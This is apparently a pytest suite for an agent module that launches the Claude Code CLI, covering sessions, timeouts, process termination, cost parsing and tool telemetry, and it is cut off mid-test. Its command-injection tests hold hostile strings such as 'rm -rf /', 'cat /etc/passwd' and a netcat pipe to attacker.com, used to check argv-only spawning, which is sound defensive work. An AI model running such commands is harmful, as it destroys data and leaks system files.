"""Tests for agent/claude_code_runner.py — session management and run_claude_prompt."""

import asyncio
import json
import sys
import time as _time
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from agent.claude_code_runner import (
    ChatSession,
    ChatResult,
    DEFAULT_EXECUTOR_MODEL,
    MODEL_RATES,
    _calculate_cost_usd,
    _cost_from_usage_dict,
    _find_claude_binary,
    _terminate_and_capture,
    end_session,
    get_active_session,
    record_tool_events,
    run_claude_chat,
    run_claude_code,
    run_claude_prompt,
    run_claude_prompt_async,
    sum_turn_costs,
    _active_sessions,
)


def _make_async_proc(returncode=0, stdout=b"", stderr=b""):
    """Build a fake asyncio subprocess with communicate() returning stdout/stderr."""
    proc = MagicMock()
    proc.returncode = returncode
    proc.communicate = AsyncMock(return_value=(stdout, stderr))
    proc.kill = MagicMock()
    return proc


class TestSessionManagement:
    """In-memory dict operations — no mocks needed."""

    def setup_method(self):
        _active_sessions.clear()

    def test_no_active_session(self):
        assert get_active_session(12345) is None

    def test_get_active_session(self):
        session = ChatSession(session_id="abc", user="test", channel_id=12345)
        _active_sessions[12345] = session
        assert get_active_session(12345) is session

    def test_end_session(self):
        session = ChatSession(session_id="abc", user="test", channel_id=12345)
        _active_sessions[12345] = session
        ended = end_session(12345)
        assert ended is session
        assert get_active_session(12345) is None

    def test_end_nonexistent_session(self):
        assert end_session(99999) is None


class TestChatSession:
    def test_dataclass_fields(self):
        s = ChatSession(session_id="abc", user="test", channel_id=1)
        assert s.session_id == "abc"
        assert s.user == "test"
        assert s.channel_id == 1
        assert s.turn_count == 0
        assert s.total_cost_usd == 0.0


class TestRunClaudePrompt:
    """Mock subprocess to test the shared utility."""

    def test_binary_not_found(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            result = run_claude_prompt("test")
            assert result["success"] is False
            assert "not found" in result["error"]

    def test_successful_json_response(self):
        import json

        fake_output = json.dumps({
            "result": "Hello world!",
            "session_id": "sess-123",
            "total_cost_usd": 0.01,
        })
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = fake_output
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result):
                result = run_claude_prompt("Say hello")
                assert result["success"] is True
                assert result["result"] == "Hello world!"
                assert result["cost_usd"] == 0.01
                assert result["session_id"] == "sess-123"

    def test_nonzero_exit_code(self):
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "Some error"

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result):
                result = run_claude_prompt("test")
                assert result["success"] is False
                assert "Some error" in result["error"]

    def test_timeout(self):
        import subprocess

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch(
                "agent.claude_code_runner.subprocess.run",
                side_effect=subprocess.TimeoutExpired(cmd="claude", timeout=30),
            ):
                result = run_claude_prompt("test", timeout=30)
                assert result["success"] is False
                assert "Timed out" in result["error"]

    def test_malformed_json_fallback(self):
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "Not valid JSON but still output"
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result):
                result = run_claude_prompt("test")
                assert result["success"] is True
                assert result["result"] == "Not valid JSON but still output"

    def test_strips_api_key_from_env(self):
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = '{"result": "ok"}'
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result) as mock_run:
                with patch.dict("os.environ", {"ANTHROPIC_API_KEY": "secret123", "CLAUDECODE": "1"}):
                    run_claude_prompt("test")
                    call_env = mock_run.call_args.kwargs.get("env", {})
                    assert "ANTHROPIC_API_KEY" not in call_env
                    assert "CLAUDECODE" not in call_env


class TestFindClaudeBinary:
    def test_returns_none_when_no_extensions(self):
        with patch("pathlib.Path.exists", return_value=False):
            result = _find_claude_binary()
            # Either None or a valid path (if actually installed)
            assert result is None or result.exists()


class TestChatResult:
    def test_dataclass_fields(self):
        r = ChatResult(
            success=True, response="hello", session_id="abc",
            duration=1.5, cost_usd=0.01, is_new_session=True,
        )
        assert r.success is True
        assert r.response == "hello"
        assert r.session_id == "abc"
        assert r.cost_usd == 0.01

    def test_failed_result(self):
        r = ChatResult(
            success=False, response="Error: timeout",
            session_id="", duration=30.0, cost_usd=0, is_new_session=False,
        )
        assert r.success is False
        assert "Error" in r.response


class TestRunClaudePromptEdgeCases:
    def test_empty_stdout(self):
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", return_value=mock_result):
                result = run_claude_prompt("test")
                assert result["success"] is True
                assert result["result"] == ""

    def test_general_exception(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch("agent.claude_code_runner.subprocess.run", side_effect=OSError("Permission denied")):
                result = run_claude_prompt("test")
                assert result["success"] is False
                assert "Permission denied" in result["error"]

    def test_result_dict_always_has_all_keys(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            result = run_claude_prompt("test")
            assert "success" in result
            assert "result" in result
            assert "cost_usd" in result
            assert "session_id" in result
            assert "duration" in result
            assert "error" in result


# =============================================================================
# run_claude_code (async, one-shot)
# =============================================================================


class TestRunClaudeCode:
    @pytest.mark.asyncio
    async def test_binary_not_found(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            success, output, duration = await run_claude_code("hi")
            assert success is False
            assert "not found" in output
            assert duration == 0.0

    @pytest.mark.asyncio
    async def test_success_returns_stdout(self):
        proc = _make_async_proc(returncode=0, stdout=b"  all good  ")
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch(
                "asyncio.create_subprocess_exec", AsyncMock(return_value=proc)
            ):
                success, output, duration = await run_claude_code("do something")
        assert success is True
        assert output == "all good"
        assert duration >= 0

    @pytest.mark.asyncio
    async def test_nonzero_exit_code_reports_stderr(self):
        proc = _make_async_proc(
            returncode=2, stdout=b"partial", stderr=b"boom"
        )
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                success, output, _ = await run_claude_code("task")
        assert success is False
        assert "boom" in output
        assert "exited with code 2" in output

    @pytest.mark.asyncio
    async def test_timeout(self):
        """wait_for raises TimeoutError → returns False with timeout message."""
        proc = _make_async_proc()
        # Force communicate to hang long enough that wait_for triggers the TimeoutError branch
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                with patch(
                    "asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())
                ):
                    success, output, _ = await run_claude_code("task")
        assert success is False
        assert "timed out" in output.lower()
        proc.kill.assert_called()

    @pytest.mark.asyncio
    async def test_general_exception(self):
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=OSError("denied")),
            ):
                success, output, _ = await run_claude_code("task")
        assert success is False
        assert "denied" in output

    @pytest.mark.asyncio
    async def test_image_paths_injected_into_prompt(self):
        """When image_paths is passed, prompt gets image instructions appended."""
        proc = _make_async_proc(returncode=0, stdout=b"analyzed")
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_code("look at this", image_paths=["/img/a.png"])

        # The prompt arg follows "-p" in the call
        args = captured["args"]
        prompt_idx = list(args).index("-p") + 1
        assert "/img/a.png" in args[prompt_idx]
        assert "look at this" in args[prompt_idx]


# =============================================================================
# run_claude_chat (async, multi-turn)
# =============================================================================


class TestRunClaudeChat:
    @pytest.mark.asyncio
    async def test_binary_not_found(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            result = await run_claude_chat("hi")
        assert isinstance(result, ChatResult)
        assert result.success is False
        assert "not found" in result.response

    @pytest.mark.asyncio
    async def test_new_session_parses_json(self):
        payload = json.dumps({
            "result": "Hello!",
            "session_id": "sess-9",
            "total_cost_usd": 0.05,
        }).encode("utf-8")
        proc = _make_async_proc(returncode=0, stdout=payload)
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_chat("hi")
        assert result.success is True
        assert result.response == "Hello!"
        assert result.session_id == "sess-9"
        assert result.cost_usd == 0.05
        assert result.is_new_session is True

    @pytest.mark.asyncio
    async def test_resume_session_passes_resume_flag(self):
        payload = json.dumps({"result": "continued", "session_id": "sess-9"}).encode("utf-8")
        proc = _make_async_proc(returncode=0, stdout=payload)
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                result = await run_claude_chat("next turn", session_id="sess-9")
        assert result.is_new_session is False
        assert "--resume" in captured["args"]

    @pytest.mark.asyncio
    async def test_malformed_json_falls_back_to_raw(self):
        proc = _make_async_proc(returncode=0, stdout=b"not json at all")
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_chat("hi")
        assert result.success is True
        assert result.response == "not json at all"
        assert result.cost_usd == 0

    @pytest.mark.asyncio
    async def test_nonzero_returncode_returns_error(self):
        proc = _make_async_proc(
            returncode=1, stdout=b'{"result": "oops", "session_id": "s"}',
            stderr=b"stderr boom",
        )
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_chat("hi")
        assert result.success is False
        assert "boom" in result.response

    @pytest.mark.asyncio
    async def test_timeout_kills_proc(self):
        proc = _make_async_proc()
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                with patch(
                    "asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())
                ):
                    result = await run_claude_chat("hi", session_id="s")
        assert result.success is False
        assert "imed out" in result.response
        assert result.session_id == "s"
        proc.kill.assert_called()

    @pytest.mark.asyncio
    async def test_general_exception(self):
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=RuntimeError("spawn failed")),
            ):
                result = await run_claude_chat("hi")
        assert result.success is False
        assert "spawn failed" in result.response

    @pytest.mark.asyncio
    async def test_image_paths_injected(self):
        proc = _make_async_proc(returncode=0, stdout=b'{"result": "ok"}')
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_chat("inspect", image_paths=["/x/img.png"])

        prompt_idx = list(captured["args"]).index("-p") + 1
        assert "/x/img.png" in captured["args"][prompt_idx]


# =============================================================================
# run_claude_prompt_async
# =============================================================================


class TestRunClaudePromptAsync:
    @pytest.mark.asyncio
    async def test_binary_not_found(self):
        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            result = await run_claude_prompt_async("hi")
        assert result["success"] is False
        assert result["error"] == "Claude Code binary not found"

    @pytest.mark.asyncio
    async def test_success_with_json(self):
        payload = json.dumps({
            "result": "hi there", "session_id": "s-1", "total_cost_usd": 0.02,
        }).encode("utf-8")
        proc = _make_async_proc(returncode=0, stdout=payload)
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_prompt_async("hi")
        assert result["success"] is True
        assert result["result"] == "hi there"
        assert result["session_id"] == "s-1"
        assert result["cost_usd"] == 0.02

    @pytest.mark.asyncio
    async def test_malformed_json_fallback(self):
        proc = _make_async_proc(returncode=0, stdout=b"raw output")
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_prompt_async("hi")
        assert result["success"] is True
        assert result["result"] == "raw output"
        assert result["cost_usd"] == 0

    @pytest.mark.asyncio
    async def test_nonzero_exit(self):
        proc = _make_async_proc(returncode=1, stdout=b"", stderr=b"fail")
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                result = await run_claude_prompt_async("hi")
        assert result["success"] is False
        assert result["error"] == "fail"

    @pytest.mark.asyncio
    async def test_timeout(self):
        proc = _make_async_proc()
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                with patch(
                    "asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())
                ):
                    result = await run_claude_prompt_async("hi", timeout=5)
        assert result["success"] is False
        assert "imed out" in result["error"]
        proc.kill.assert_called()

    @pytest.mark.asyncio
    async def test_generic_exception(self):
        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=RuntimeError("boom")),
            ):
                result = await run_claude_prompt_async("hi")
        assert result["success"] is False
        assert "boom" in result["error"]


class TestFindClaudeBinaryGlob:
    """Exercise the glob branch of _find_claude_binary."""

    def test_returns_first_candidate_when_glob_hits(self, tmp_path, monkeypatch):
        # Build a fake VS Code extensions directory
        ext_dir = tmp_path / ".vscode" / "extensions"
        bin_path = (
            ext_dir
            / "anthropic.claude-code-0.1.0"
            / "resources"
            / "native-binary"
            / "claude.exe"
        )
        bin_path.parent.mkdir(parents=True)
        bin_path.write_bytes(b"\x00")
        monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
        result = _find_claude_binary()
        assert result == bin_path

    def test_returns_none_when_no_candidates(self, tmp_path, monkeypatch):
        # extensions dir exists but contains nothing matching
        ext_dir = tmp_path / ".vscode" / "extensions"
        ext_dir.mkdir(parents=True)
        monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
        assert _find_claude_binary() is None

    def test_prefers_highest_version_extension(self, tmp_path, monkeypatch):
        """Multiple installed versions → the sorted-descending pick wins."""
        ext_dir = tmp_path / ".vscode" / "extensions"
        for ver in ("0.1.0", "0.2.5", "0.1.9"):
            p = (
                ext_dir
                / f"anthropic.claude-code-{ver}"
                / "resources"
                / "native-binary"
                / "claude.exe"
            )
            p.parent.mkdir(parents=True)
            p.write_bytes(b"\x00")
        monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
        result = _find_claude_binary()
        assert result is not None
        assert "0.2.5" in str(result)


# =============================================================================
# Command injection prevention — TK-393 security requirement
#
# All four entrypoints (run_claude_code, run_claude_chat, run_claude_prompt,
# run_claude_prompt_async) spawn the Claude binary via arg-list subprocess
# calls, never `shell=True`. These tests lock in that property: shell
# metacharacters in user-controlled fields must flow through as literal
# argv tokens, not be interpreted by a shell.
# =============================================================================


SHELL_METACHARACTERS = [
    "; rm -rf /",
    "`whoami`",
    "$(id)",
    "&& cat /etc/passwd",
    "| nc attacker.com 4444",
    "'; DROP TABLE users; --",
    "prompt\nmalicious second line",
]


class TestCommandInjectionPrevention:
    """Verify user input never reaches a shell — only argv tokens to Claude CLI."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
    async def test_run_claude_code_passes_prompt_as_single_arg(self, evil):
        """Malicious prompt content sits in argv[i+1] after '-p' as one literal token."""
        proc = _make_async_proc(returncode=0, stdout=b"safe")
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            captured["kwargs"] = kwargs
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_code(evil)

        args = list(captured["args"])
        # No shell=True kwarg — asyncio.create_subprocess_exec doesn't accept it anyway,
        # but verify we used the exec (argv) variant
        assert "shell" not in captured["kwargs"]
        prompt_idx = args.index("-p") + 1
        # The entire malicious string arrives as one token, unsplit
        assert args[prompt_idx] == evil

    @pytest.mark.asyncio
    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
    async def test_run_claude_chat_passes_prompt_as_single_arg(self, evil):
        proc = _make_async_proc(returncode=0, stdout=b'{"result": "safe"}')
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_chat(evil)

        args = list(captured["args"])
        prompt_idx = args.index("-p") + 1
        assert args[prompt_idx] == evil

    @pytest.mark.asyncio
    async def test_run_claude_chat_session_id_passes_as_arg(self):
        """A malicious session_id must reach argv as a literal token after --resume."""
        evil_session = "abc; rm -rf /"
        proc = _make_async_proc(returncode=0, stdout=b'{"result": "ok"}')
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_chat("hi", session_id=evil_session)

        args = list(captured["args"])
        resume_idx = args.index("--resume") + 1
        assert args[resume_idx] == evil_session

    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
    def test_run_claude_prompt_uses_arg_list_not_shell(self, evil):
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = '{"result": "ok"}'
        mock_result.stderr = ""

        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
            with patch(
                "agent.claude_code_runner.subprocess.run", return_value=mock_result
            ) as mock_run:
                run_claude_prompt(evil)

        call = mock_run.call_args
        # First positional arg is the argv list (never a string, never shell=True)
        argv = call.args[0]
        assert isinstance(argv, list)
        assert call.kwargs.get("shell", False) is False
        prompt_idx = argv.index("-p") + 1
        assert argv[prompt_idx] == evil

    @pytest.mark.asyncio
    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
    async def test_run_claude_prompt_async_uses_arg_list(self, evil):
        proc = _make_async_proc(returncode=0, stdout=b'{"result": "ok"}')
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            captured["kwargs"] = kwargs
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_prompt_async(evil)

        args = list(captured["args"])
        assert "shell" not in captured["kwargs"]
        prompt_idx = args.index("-p") + 1
        assert args[prompt_idx] == evil

    @pytest.mark.asyncio
    async def test_image_paths_with_metacharacters_stay_in_prompt_arg(self):
        """Paths with shell metacharacters are embedded in the prompt, not passed as flags."""
        evil_path = "/tmp/img; rm -rf /.png"
        proc = _make_async_proc(returncode=0, stdout=b"ok")
        captured = {}

        async def fake_create(*args, **kwargs):
            captured["args"] = args
            return proc

        with patch(
            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
        ):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
                await run_claude_code("analyze", image_paths=[evil_path])

        args = list(captured["args"])
        prompt_idx = args.index("-p") + 1
        # The evil path is inside the single prompt argv token
        assert evil_path in args[prompt_idx]
        # And no stray argv token matches it as a standalone arg
        assert args.count(evil_path) == 0


# =============================================================================
# TK-461 — Executor wall-clock timeout (SIGTERM → wait → SIGKILL)
# =============================================================================


class TestTerminateAndCapture:
    """Unit tests for the _terminate_and_capture helper itself."""

    @pytest.mark.asyncio
    async def test_terminate_succeeds_quickly(self):
        """terminate() + graceful proc.wait() within grace period — no kill()."""
        proc = MagicMock()
        proc.terminate = MagicMock()
        proc.wait = AsyncMock(return_value=0)
        proc.kill = MagicMock()
        proc.stdout = None
        proc.stderr = None

        out, err = await _terminate_and_capture(proc, correlation_id="x", grace_seconds=5)

        proc.terminate.assert_called_once()
        proc.kill.assert_not_called()
        assert out == ""
        assert err == ""

    @pytest.mark.asyncio
    async def test_escalates_to_kill_after_grace(self):
        """If proc.wait times out, SIGKILL is sent."""
        proc = MagicMock()
        proc.terminate = MagicMock()
        # First wait (after SIGTERM) hangs → TimeoutError. Second wait (after SIGKILL) returns.
        proc.wait = AsyncMock(side_effect=[asyncio.TimeoutError(), 0])
        proc.kill = MagicMock()
        proc.stdout = None
        proc.stderr = None

        with patch(
            "agent.claude_code_runner.asyncio.wait_for",
            AsyncMock(side_effect=[asyncio.TimeoutError(), 0]),
        ):
            await _terminate_and_capture(proc, correlation_id="x", grace_seconds=1)

        proc.terminate.assert_called_once()
        proc.kill.assert_called_once()

    @pytest.mark.asyncio
    async def test_swallows_terminate_errors(self):
        """A ProcessLookupError from terminate() must not propagate."""
        proc = MagicMock()
        proc.terminate = MagicMock(side_effect=ProcessLookupError())
        proc.wait = AsyncMock(return_value=0)
        proc.kill = MagicMock()
        proc.stdout = None
        proc.stderr = None

        # Should not raise
        out, err = await _terminate_and_capture(proc, correlation_id="x", grace_seconds=1)
        assert out == ""
        assert err == ""


@pytest.mark.skipif(
    sys.platform == "win32" and sys.version_info < (3, 8),
    reason="asyncio subprocess support requires proactor event loop on Windows",
)
class TestRunnerEnforcesTimeout:
    """Integration-style test: a real hung subprocess gets terminated.

    Covers TK-461 acceptance criteria:
      (a) the process is terminated well before its natural exit
      (b) the executor_runs DB row is marked status='timeout'
      (c) partial stdout/stderr is captured (archive_run is called)
    """

    @pytest.mark.asyncio
    async def test_runner_enforces_timeout(self, monkeypatch):
        import agent.claude_code_runner as runner

        # Keep the test quick: 2s wall-clock + 2s SIGTERM grace.
        monkeypatch.setattr(runner.settings, "executor_max_runtime_seconds", 2)
        monkeypatch.setattr(runner.settings, "executor_sigterm_grace_seconds", 2)

        # Make _find_claude_binary return *something* truthy; the real command
        # line is replaced below via the create_subprocess_exec patch.
        monkeypatch.setattr(
            runner, "_find_claude_binary", lambda: Path(sys.executable)
        )

        # Intercept DB writes so we can inspect them without touching SQLite.
        db_records: list[dict] = []

        def fake_record(**fields):
            db_records.append(dict(fields))
            return 1

        monkeypatch.setattr(runner.executor_runs_db, "record_run", fake_record)

        # Intercept archive_run so we can verify partial-output capture.
        archives: list[dict] = []

        def fake_archive(run_id, stdout, stderr, branch_name):
            archives.append({
                "run_id": run_id,
                "stdout": stdout,
                "stderr": stderr,
                "branch": branch_name,
            })
            return Path("/fake/archive") / run_id

        monkeypatch.setattr(runner.executor_runs_db, "archive_run", fake_archive)

        # Skip real git branch detection — keeps the test deterministic on CI.
        monkeypatch.setattr(runner, "_detect_branch", lambda cwd: "test-branch")

        # Redirect the subprocess spawn at a hung python sleep. The args
        # passed by run_claude_code (to /fake/claude) are discarded here.
        real_create = asyncio.create_subprocess_exec

        async def fake_create(*_args, **kwargs):
            sleep_args = [
                sys.executable,
                "-u",
                "-c",
                "import sys, time; print('STARTED_MARKER', flush=True); "
                "sys.stdout.flush(); time.sleep(120)",
            ]
            # Preserve stdout/stderr=PIPE + cwd + env so the runner can read pipes.
            return await real_create(*sleep_args, **kwargs)

        monkeypatch.setattr(
            "asyncio.create_subprocess_exec", fake_create
        )

        t0 = _time.time()
        success, output, duration = await runner.run_claude_code(
            "test prompt", jira_key="TK-TEST"
        )
        elapsed = _time.time() - t0

        # (a) Process was terminated — elapsed time is far less than the 120s sleep.
        assert success is False
        assert elapsed < 30, (
            f"Expected prompt termination, but elapsed={elapsed:.1f}s — "
            "the subprocess may not have been killed"
        )
        assert "timed out" in output.lower()

        # (b) DB row marked status='timeout'.
        timeout_rows = [r for r in db_records if r.get("status") == "timeout"]
        assert len(timeout_rows) == 1, (
            f"Expected exactly one timeout record, got records={db_records}"
        )
        assert timeout_rows[0].get("duration_ms", 0) > 0

        # (c) Partial output capture mechanism ran — archive_run was called
        # with the captured stdout/stderr strings. Content is best-effort
        # (may depend on pipe buffering), but the call itself must happen.
        assert len(archives) == 1
        assert isinstance(archives[0]["stdout"], str)
        assert isinstance(archives[0]["stderr"], str)


class TestTimeoutIsConfigurable:
    """Verify the wall-clock timeout comes from settings, not a hardcoded constant."""

    @pytest.mark.asyncio
    async def test_timeout_reads_from_settings(self, monkeypatch):
        """run_claude_code passes settings.executor_max_runtime_seconds to wait_for."""
        import agent.claude_code_runner as runner

        monkeypatch.setattr(
            runner.settings, "executor_max_runtime_seconds", 4242
        )

        proc = _make_async_proc(returncode=0, stdout=b"ok")
        captured_timeouts = []

        async def fake_wait_for(coro, timeout):
            captured_timeouts.append(timeout)
            # Drain the underlying coroutine so it doesn't leak
            try:
                return await coro
            except Exception:
                return None

        with patch(
            "agent.claude_code_runner._find_claude_binary",
            return_value=Path("/fake/claude"),
        ):
            with patch(
                "asyncio.create_subprocess_exec", AsyncMock(return_value=proc)
            ):
                with patch("asyncio.wait_for", side_effect=fake_wait_for):
                    await run_claude_code("hi")

        assert 4242 in captured_timeouts


class TestRecordToolEvents:
    """Per-tool telemetry: stream-json events -> executor_tool_calls rows."""

    @pytest.fixture(autouse=True)
    def _isolate_db(self, tmp_path, monkeypatch):
        from agent import executor_runs_db

        db_path = tmp_path / "executor_runs.db"
        monkeypatch.setattr(executor_runs_db, "DB_DIR", tmp_path)
        monkeypatch.setattr(executor_runs_db, "DB_PATH", db_path)
        executor_runs_db._local.__dict__.pop("conn", None)
        executor_runs_db.init_db()
        yield
        conn = getattr(executor_runs_db._local, "conn", None)
        if conn:
            conn.close()
            executor_runs_db._local.conn = None

    def test_paired_tool_use_and_tool_result_inserts_one_row(self):
        from agent import executor_runs_db

        run_id = executor_runs_db.record_run(status="running")
        pending: dict = {}

        record_tool_events(
            {"type": "tool_use", "id": "toolu_a", "name": "Bash",
             "input": {"command": "ls"}},
            run_id, pending,
        )
        record_tool_events(
            {"type": "tool_result", "tool_use_id": "toolu_a",
             "is_error": False, "content": "ok"},
            run_id, pending,
        )

        rows = executor_runs_db.get_tool_calls(run_id)
        assert len(rows) == 1
        assert rows[0]["tool_name"] == "Bash"
        assert rows[0]["ok"] == 1
        assert rows[0]["duration_ms"] is not None and rows[0]["duration_ms"] >= 0

    def test_tool_use_without_matching_result_leaves_no_row(self):
        from agent import executor_runs_db

        run_id = executor_runs_db.record_run(status="running")
        pending: dict = {}

        record_tool_events(
            {"type": "tool_use", "id": "toolu_x", "name": "Edit"},
            run_id, pending,
        )
        # No tool_result — row is NOT written yet. Only completed calls get rows.
        assert executor_runs_db.get_tool_calls(run_id) == []
        assert "toolu_x" in pending

    def test_error_result_marks_ok_false(self):
        from agent import executor_runs_db

        run_id = executor_runs_db.record_run(status="running")
        pending: dict = {}
        record_tool_events(
            {"type": "tool_use", "id": "toolu_err", "name": "Bash"},
            run_id, pending,
        )
        record_tool_events(
            {"type": "tool_result", "tool_use_id": "toolu_err",
             "is_error": True, "content": "command failed: exit 1"},
            run_id, pending,
        )

        row = executor_runs_db.get_tool_calls(run_id)[0]
        assert row["ok"] == 0
        assert row["error_message"] == "command failed: exit 1"

    def test_nested_assistant_message_shape(self):
        """Real streams wrap tool_use inside an assistant message's content[]."""
        from agent import executor_runs_db

        run_id = executor_runs_db.record_run(status="running")
        pending: dict = {}
        record_tool_events(
            {
                "type": "assistant",
                "message": {
                    "content": [
                        {"type": "tool_use", "id": "toolu_nest",
                         "name": "Read", "input": {"file_path": "/a"}},
                    ],
                    "usage": {"input_tokens": 17, "output_tokens": 5},
                },
            },
            run_id, pending,
        )
        record_tool_events(
            {
                "type": "user",
                "message": {
                    "content": [
                        {"type": "tool_result", "tool_use_id": "toolu_nest",
                         "is_error": False, "content": "file data"},
                    ],
                },
            },
            run_id, pending,
        )
        rows = executor_runs_db.get_tool_calls(run_id)
        assert len(rows) == 1
        assert rows[0]["tool_name"] == "Read"

    def test_token_counts_attributed_to_last_completed_call(self):
        """Usage blocks arriving with the result are attributed to that row."""
        from agent import executor_runs_db

        run_id = executor_runs_db.record_run(status="running")
        pending: dict = {}
        record_tool_events(
            {"type": "tool_use", "id": "toolu_tok", "name": "Grep"},
            run_id, pending,
        )
        record_tool_events(
            {
                "type": "user",
                "message": {
                    "content": [
                        {"type": "tool_result", "tool_use_id": "toolu_tok",
                         "is_error": False, "content": "match"},
                    ],
                    "usage": {"input_tokens": 42, "output_tokens": 7},
                },
            },
            run_id, pending,
        )
        row = executor_runs_db.get_tool_calls(run_id)[0]
        assert row["input_tokens"] == 42
        assert row["output_tokens"] == 7

    def test_no_db_run_id_is_noop(self):
        """Passing None for db_run_id must not raise and must insert nothing."""
        from agent import executor_runs_db

        pending: dict = {}
        # Should not raise
        result = record_tool_events(
